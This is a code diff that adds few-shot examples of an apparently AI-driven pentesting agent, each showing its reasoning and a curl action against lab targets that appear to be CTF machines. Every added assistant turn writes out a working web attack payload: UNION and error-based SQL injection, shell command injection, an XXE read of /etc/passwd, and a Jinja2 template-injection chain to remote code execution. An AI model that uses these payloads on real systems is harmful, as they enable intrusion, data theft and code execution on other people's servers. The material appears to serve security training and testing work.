@@ -288,6 +288,101 @@ What's your next action?"""
   "action_input": "checksec --file=vuln_elf 2>/dev/null || file vuln_elf; strings vuln_elf | grep -i flag"
 }"""
     },
+
+    # === UNION-BASED SQLI ===
+    {
+        "role": "user",
+        "content": """Target: 10.0.0.10
+Phase: EXPLOITATION
+Last result: SQLi confirmed on /api/search?q= via single-quote error. SQLite database detected.
+Previous findings: SQLi boolean-based works, but login bypass only shows admin page, no flag
+
+What's your next action?"""
+    },
+    {
+        "role": "assistant",
+        "content": """{
+  "thought": "Boolean-based SQLi only bypasses auth — I need to extract actual data. UNION-based injection lets me pull data from other tables. First, I need to find the column count with ORDER BY, then craft the UNION SELECT to dump table names from sqlite_master.",
+  "action": "curl",
+  "action_input": "-s 'http://10.0.0.10/api/search?q=test' UNION SELECT 1,2,3,group_concat(name) FROM sqlite_master WHERE type='table'--"
+}"""
+    },
+
+    # === ERROR-BASED SQLI ===
+    {
+        "role": "user",
+        "content": """Target: 10.0.0.10
+Phase: EXPLOITATION
+Last result: MySQL backend detected. UNION injection blocked by WAF.
+Previous findings: SQLi confirmed via error messages, WAF filters UNION and SELECT
+
+What's your next action?"""
+    },
+    {
+        "role": "assistant",
+        "content": """{
+  "thought": "WAF blocks UNION/SELECT but error messages leak data. I'll use error-based injection with UPDATEXML or EXTRACTVALUE to force MySQL to dump database contents in the error message. These functions aren't typically filtered.",
+  "action": "curl",
+  "action_input": "-s 'http://10.0.0.10/search?id=1 AND UPDATEXML(1,CONCAT(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e),1)'"
+}"""
+    },
+
+    # === COMMAND INJECTION ===
+    {
+        "role": "user",
+        "content": """Target: 10.0.0.10
+Phase: EXPLOITATION
+Last result: Found /api/ping endpoint that takes a 'host' parameter and returns ping output.
+Previous findings: Web app, nginx, PHP, ping functionality exposed
+
+What's your next action?"""
+    },
+    {
+        "role": "assistant",
+        "content": """{
+  "thought": "A ping endpoint that passes user input to the shell — classic command injection. I'll chain commands with a semicolon to break out of the ping command. First test with id, then escalate to reading flags.",
+  "action": "curl",
+  "action_input": "-s 'http://10.0.0.10/api/ping?host=127.0.0.1;id;cat /flag.txt'"
+}"""
+    },
+
+    # === XXE ===
+    {
+        "role": "user",
+        "content": """Target: 10.0.0.10
+Phase: EXPLOITATION
+Last result: Found /api/import endpoint that accepts XML uploads for data import.
+Previous findings: Web app with XML parsing, REST API
+
+What's your next action?"""
+    },
+    {
+        "role": "assistant",
+        "content": """{
+  "thought": "An XML import endpoint is a prime XXE target. I'll inject an external entity that reads /etc/passwd to confirm, then escalate to read the flag. The XML parser likely has external entity processing enabled.",
+  "action": "curl",
+  "action_input": "-s -X POST http://10.0.0.10/api/import -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><data><value>&xxe;</value></data>'"
+}"""
+    },
+
+    # === SSTI TO RCE ===
+    {
+        "role": "user",
+        "content": """Target: 10.0.0.30
+Phase: EXPLOITATION
+Last result: SSTI confirmed — {{7*7}} returned 49. Jinja2 template engine detected.
+Previous findings: SSTI in /render endpoint, need to escalate to RCE
+
+What's your next action?"""
+    },
+    {
+        "role": "assistant",
+        "content": """{
+  "thought": "SSTI confirmed in Jinja2. The classic RCE chain is using config.__class__.__mro__[1].__subclasses__() to find os._wrap_close or subprocess.Popen. I'll use the MRO traversal to pop a shell and read the flag.",
+  "action": "curl",
+  "action_input": "-s -X POST http://10.0.0.30:5000/render -H 'Content-Type: application/json' -d '{\"template\":\"{{config.__class__.__mro__[1].__subclasses__()[258](\\\"cat /flag.txt\\\",shell=True,stdout=-1).communicate()[0]}}\",\"name\":\"test\"}'"
+}"""
+    },
 ]
 
 
